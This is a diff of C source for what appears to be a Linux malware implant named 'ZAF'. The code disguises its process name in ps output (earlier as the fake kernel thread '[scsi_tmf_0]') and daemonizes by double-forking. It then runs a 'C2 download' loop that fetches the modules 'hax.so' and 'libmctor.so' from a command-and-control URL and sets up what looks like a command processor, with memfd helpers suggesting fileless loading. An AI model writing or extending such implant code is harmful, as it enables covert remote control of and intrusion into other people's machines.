@@ -204,20 +204,14 @@ int setMemfdTbl(int shm_fd, char* mname) {
 }
 
 
-int main (int argc, char **argv) {
 
+int main (int argc, char **argv) {
     FILE *fp;
-    char *modules[2] = {"libmctor.so", "hax.so"};
-    char *ccurl="http://127.0.0.1:8080/";
     char *logFile="/tmp/_mf.log";
-    char urlbuf[255] = {'\0'};
-	int fd;
-    int i;
+
 
     argv = save_ps_display_args(argc, argv);
-    init_ps_display("[scsi_tmf_0]");
-
-    backgroundDaemonLeader();
+    init_ps_display("zaf");
 
     log_info("Opening log file: %s", logFile);
     fp = fopen (logFile,"w");
@@ -227,9 +221,27 @@ int main (int argc, char **argv) {
         log_set_fp(fp);
     }
 
+    backgroundDaemonLeader();
+
+    //load_so(fd, fd_s);
+    fclose (fp);
+	return 0;
+}
+
+void doWork(){
+
+    char *modules[] = {
+        "hax.so",
+        "libmctor.so"
+    };
+    char *ccurl="http://127.0.0.1:8080/";
+    char urlbuf[255] = {'\0'};
+	int fd, i;
+
 	log_debug("\n\n=== ZAF ===\n");
 	log_debug("Trying for C2 download...");
-    for(i = 0; i < 2; i++)
+
+    for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
     {
         snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
         log_debug("Module URL = %s", urlbuf);
@@ -239,62 +251,73 @@ int main (int argc, char **argv) {
         }
 
     }
-
-    // TODO: SIGHUP/SIGINT/SIGTERM
-    // TODO: ps rename
-    // TODO: daemonize
     setupCmdP();
-    //load_so(fd, fd_s);
-    fclose (fp);
-	exit(0);
-}
 
+}
 int backgroundDaemonLeader(){
 
+
     // Fork, allowing the parent process to terminate.
+    log_debug("before first fork()");
     pid_t pid = fork();
+    log_debug("after first fork()");
     if (pid == -1) {
         log_error("failed to fork while daemonising (errno=%d)",errno);
     } else if (pid != 0) {
+        log_debug("after first fork(0 in parent. exiting.");
         _exit(0);
     }
 
     // Start a new session for the daemon.
+    log_debug("before setsid()");
     if (setsid()==-1) {
         log_error("failed to become a session leader while daemonising(errno=%d)",errno);
     }
 
     // Fork again, allowing the parent process to terminate.
-    signal(SIGHUP,SIG_IGN);
+    //signal(SIGHUP,SIG_IGN);
+    log_debug("before signal SIGCHLD");
     signal(SIGCHLD, SIG_IGN); // avoid defunct processes. 
+    log_debug("before second fork()");
     pid=fork();
+    log_debug("after second fork()");
     if (pid == -1) {
         log_error("failed to fork while daemonising (errno=%d)",errno);
     } else if (pid != 0) {
+        log_debug("after first fork(0 in parent. exiting.");
         _exit(0);
     }
 
     // Set the current working directory to the root directory.
+    log_debug("before chdir()");
     if (chdir("/tmp") == -1) {
         log_error("failed to change working directory while daemonising (errno=%d)",errno);
     }
 
     // Set the user file creation mask to zero.
+    log_debug("before umask()");
     umask(0);
 
+    log_debug("before close FD 0,1,2");
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
     if (open("/dev/null",O_RDONLY) == -1) {
-      log_error("failed to reopen stdin while daemonising (errno=%d)",errno);
+      printf("failed to reopen stdin while daemonising (errno=%d)",errno);
     }
     if (open("/dev/null",O_WRONLY) == -1) {
-      log_error("failed to reopen stdout while daemonising (errno=%d)",errno);
+      printf("failed to reopen stdout while daemonising (errno=%d)",errno);
     }
     if (open("/dev/null",O_RDWR) == -1) {
-	  log_error("failed to reopen stderr while daemonising (errno=%d)",errno);
+	  printf("failed to reopen stderr while daemonising (errno=%d)",errno);
     }
+    log_debug("after reopen FD 0,1,2 ro /dev/null");
 
+    log_debug("before signal handlers");
+    setSignalHandlers(500000);
+    log_debug("after signal handlers");
+    log_debug("before doWork");
+    doWork();
     return 0;
 }
 
@@ -504,3 +527,37 @@ int push(node_t * head, char* path, char* mname) {
 
     return 0;
 }
+
+/* -------------- SIG Handlers ------------------- */
+
+void setSignalHandlers(){
+    signal(SIGHUP, handleSig);
+    signal(SIGUSR1, handleSig);
+}
+
+void handleSig(int signo) {
+    /*
+     * Signal safety: It is not safe to call clock(), printf(),
+     * or exit() inside a signal handler. Instead, we set a flag.
+     */
+    switch(signo){
+        case SIGHUP:
+            log_warn("Signal handler got SIGHUP signal ... ");
+            sigflag = 0; // reset
+            doSigHup();
+            break;
+        case SIGUSR1:
+            log_warn("Signal handler got SIGUSR1 signal ... ");
+            sigflag = 0; // reset
+            doSigUsr1();
+            break;
+    }
+}
+
+void doSigHup(void){
+    log_debug("Executing SIGHUP code here ...");
+}
+void doSigUsr1(void){
+    log_debug("Executing SIGUSR1 code here ...");
+}
+
